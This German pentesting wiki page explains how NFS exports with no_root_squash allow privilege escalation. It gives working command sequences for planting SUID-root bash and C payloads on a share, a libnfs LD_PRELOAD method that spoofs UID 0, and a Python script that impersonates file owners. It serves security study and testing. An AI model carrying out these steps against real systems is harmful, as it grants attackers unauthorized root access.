# Privilege Escalation durch NFS-Fehlkonfiguration mit No Root Squash

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen zu Squashing

Bei NFS AUTH_SYS/AUTH_UNIX basiert der Server die Überprüfung der Dateiberechtigungen auf der in jeder RPC-Anfrage übermittelten `uid` und `gid`. Andere Security-Flavors wie Kerberos verwenden andere Credentials, und der Server kann numerische Credentials vor der Berechtigungsprüfung zuordnen.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Ordnet jede UID und GID dem anonymen Account zu, der unter Linux standardmäßig `nobody` (65534) ist. `no_all_squash` ist der Standard für Anfragen, die nicht von root stammen.<sup>[[4]](#references)</sup>
- **`root_squash`**: Dies ist der Standard unter Linux und ordnet Anfragen mit UID/GID 0 (root) dem anonymen Account zu; andere UIDs und GIDs werden nicht gesquasht.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Deaktiviert das Root-Squashing, sodass Anfragen mit UID/GID 0 auf dem Server als root ausgewertet werden können.<sup>[[4]](#references)</sup>

Wenn ein zugelassener Client ein beschreibbares Export in **`/etc/exports`** mounten kann, das mit **`no_root_squash`** konfiguriert ist, können seine UID/GID-0-Anfragen dort als root-User des Servers schreiben.<sup>[[4]](#references)</sup>

Weitere Informationen zu **NFS** findest du hier:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

Option 1 mit bash:
- Auf einem zugelassenen Client ein beschreibbares Export als root mounten, **`/bin/bash`** dorthin kopieren, dessen **SUID**-Bit setzen und es über einen Victim-Mount ausführen, der `nosuid` nicht verwendet.<sup>[[2]](#references)[[4]](#references)</sup>
- Damit die hochgeladene Datei weiterhin root gehört, muss der Server **`no_root_squash`** verwenden. Wenn root gesquasht wird, ist ein SUID-Binary für einen anderen Account nur möglich, wenn der Client es mit der numerischen UID/GID dieses Accounts legitim erstellen oder besitzen kann.<sup>[[4]](#references)</sup>
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Option 2 mit kompiliertem C-Code:
- Binde das Verzeichnis von einem erlaubten Client ein, kopiere einen kompilierten Payload hinein, der SUID-Berechtigungen ausnutzt, setze dessen **SUID**-Bit und führe ihn vom Opfer aus (siehe einige [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
- Dieselben Einschränkungen wie zuvor
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Lokaler Exploit

> [!TIP]
> Beachte, dass du die **Remote-Version weiterhin verwenden kannst, um diese Privilege Escalation auszunutzen, wenn du einen Tunnel von deiner Maschine zur Zielmaschine erstellen kannst, indem du die erforderlichen Ports tunnelst**.\
> Der folgende Trick ist nützlich, wenn `/etc/exports` den Export auf die IP-Adresse des Opfers beschränkt: Der Remote-Client kann ihn nicht mounten, aber die lokale Technik kann über den Share arbeiten, der bereits auf dem erlaubten Host gemountet ist.<sup>[[2]](#references)</sup>\
> Für diese unprivilegierte libnfs-Methode muss der Export in **`/etc/exports`** das `insecure`-Flag verwenden, damit der Prozess einen nicht reservierten Quellport nutzen kann; `secure` ist die Standardeinstellung, allerdings benötigt ein Prozess, der einen reservierten Port binden kann, diese Option nicht.<sup>[[1]](#references)[[4]](#references)</sup>

### Grundlegende Informationen

Ein NFSv3-AUTH_UNIX-Client übermittelt bei jedem Aufruf seine effektive UID, GID und Gruppen, und der Server verwendet diese für die Berechtigungsprüfungen. Diese lokale Technik missbraucht dieses Modell, indem sie die RPC-Credentials über [libnfs](https://github.com/sahlberg/libnfs) fälscht; das Preload-Modul unterstützt das Überschreiben der UID/GID im NFS-Kontext.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Kompilieren der Library

Das libnfs-Beispiel kann Anpassungen für den Zielkernel erfordern; die hier verwendete Anleitung weist ausdrücklich darauf hin, die fallocate-Syscalls vor dem Kompilieren des Preload-Moduls auszukommentieren.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Exploit durchführen

Das Beispiel erstellt einen kleinen C-Helfer, der eine Shell startet, legt ihn auf der Freigabe ab und verwendet `ld_nfs.so` mit UID 0 im NFS-Kontext, um ihn zu SUID-root zu machen.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Exploit-Code kompilieren:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Platziere den Exploit auf dem Share und ändere seine Berechtigungen, indem du die UID fälschst**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Führe den exploit aus, um Root-Rechte zu erlangen**.<sup>[[2]](#references)</sup>
```bash
/mnt/share/a.out
#root
```
### Bonus: NFShell für unauffälligen Dateizugriff

Sobald Root-Zugriff erlangt wurde, setzt dieses `nfsh.py`-Muster die effektive UID auf die UID der Zieldatei, bevor ein Befehl ausgeführt wird, und ermöglicht so den Zugriff, ohne den Besitz rekursiv zu ändern.<sup>[[2]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Ausführen wie:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Eine Geschichte über eine weniger bekannte NFS-privesc](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: Spezifikation des NFS-Version-3-Protokolls](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
